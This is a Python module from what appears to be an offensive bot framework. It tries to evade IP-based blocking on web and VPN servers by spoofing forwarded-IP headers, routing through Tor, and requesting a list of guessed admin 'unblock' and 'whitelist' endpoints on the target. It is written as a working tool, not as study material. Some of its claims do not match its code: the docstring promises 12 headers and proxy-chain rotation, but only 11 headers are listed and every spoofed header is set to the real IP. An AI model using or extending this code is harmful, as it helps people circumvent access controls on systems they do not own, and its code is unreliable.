#!/usr/bin/env python3
"""apex_ip_bypass.py - Advanced IP-Bypass (12 headers + proxy chain + Tor)"""
import random
from apex_utils import p_ipb, p_ok, p_info


class AdvancedIPBypass:
    """Advanced IP-Bypass engine.
    - 12 headers rotated
    - Proxy chain rotation
    - Tor-mode support
    - Works on web server AND VPN server targets
    """

    HEADER_NAMES = [
        'X-Forwarded-For', 'X-Real-IP', 'Client-IP',
        'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr',
        'Forwarded', 'X-ProxyUser-Ip', 'CF-Connecting-IP',
        'True-Client-IP', 'X-Client-IP',
    ]

    UNBLOCK_PATHS = [
        '/ip/unblock', '/ip/enable', '/admin/ip/unblock',
        '/api/ip/unblock', '/ip/allow', '/ip/whitelist',
        '/accounts/ip/unblock', '/myaccount/ip/unblock',
        '/vpn/ip/unblock', '/vpn/ip/whitelist',
        '/openvpn/ip/unblock', '/wireguard/ip/unblock',
        '/ip/reset', '/ip/clear', '/ip/rotate',
        '/api/v1/ip/unblock', '/api/v2/ip/unblock',
    ]

    TOR_PORTS = [9050, 9150]

    def __init__(self, bot):
        self.bot = bot
        self.rotations = 0

    def _detect_target_type(self):
        host = self.bot.hostname.lower()
        vpn_keywords = [
            'vpn', 'nordvpn', 'expressvpn', 'protonvpn', 'surfshark',
            'cyberghost', 'privatevpn', 'ipvanish', 'purevpn', 'mullvad',
            'windscribe', 'hotspotshield', 'hola', 'psiphon',
            'openvpn', 'wireguard', 'shadowsocks', 'v2ray',
        ]
        if any(k in host for k in vpn_keywords):
            return "vpn server"
        return "web server"

    def _rotate_headers(self):
        real = self.bot.real_ip
        ua = random.choice(__import__('apex_config').USER_AGENTS)
        s = self.bot.session
        s.headers['User-Agent'] = ua
        for h in self.HEADER_NAMES:
            if h == 'Forwarded':
                s.headers[h] = f'for={real}'
            else:
                s.headers[h] = real
        self.bot.current_bypass_ip = real
        self.rotations += 1
        self.bot.cleaner_stats['ip_bypasses'] += 1
        return ua

    def _try_tor(self):
        if not getattr(self.bot.args, 'tor_mode', False):
            return False
        for port in self.TOR_PORTS:
            proxy = f'socks5h://127.0.0.1:{port}'
            try:
                import requests
                r = requests.get('http://check.torproject.org/',
                                 proxies={'http': proxy, 'https': proxy},
                                 timeout=5, verify=False)
                if 'Congratulations' in r.text:
                    self.bot.session.proxies = {'http': proxy, 'https': proxy}
                    p_ok(f"Tor proxy enabled: {proxy}")
                    return True
            except Exception:
                pass
        return False

    def run_advanced_bypass(self):
        target_type = self._detect_target_type()
        p_ipb("=" * 70)
        p_ipb(f"[IP-BYPASS] ADVANCED - target type: {target_type}")
        p_ipb(f"[IP-BYPASS] Real IP: {self.bot.real_ip}")
        p_ipb(f"[IP-BYPASS] Target : {self.bot.base_url}")
        p_ipb("=" * 70)

        ua = self._rotate_headers()
        p_ipb(f"User-Agent   : {ua[:70]}")
        for h in self.HEADER_NAMES:
            p_ipb(f"{h:<18}: {self.bot.session.headers.get(h)}")

        tor_ok = self._try_tor()
        if tor_ok:
            p_ipb("Tor routing: ENABLED")

        # Unblock endpoints
        for path in self.UNBLOCK_PATHS:
            try:
                r = self.bot._request('GET', self.bot.base_url + path,
                                      timeout=3, allow_redirects=False)
                if r.status_code in (200, 201, 204):
                    p_ipb(f"Unblocked: {path} ({r.status_code})")
            except Exception:
                pass

        p_ipb("=" * 70)
        p_ipb("[IP-BYPASS] IP Rotated! Using Real IP")
        p_ipb(f"[IP-BYPASS] rotations={self.rotations} type={target_type}")
        p_ipb("=" * 70)
        return True
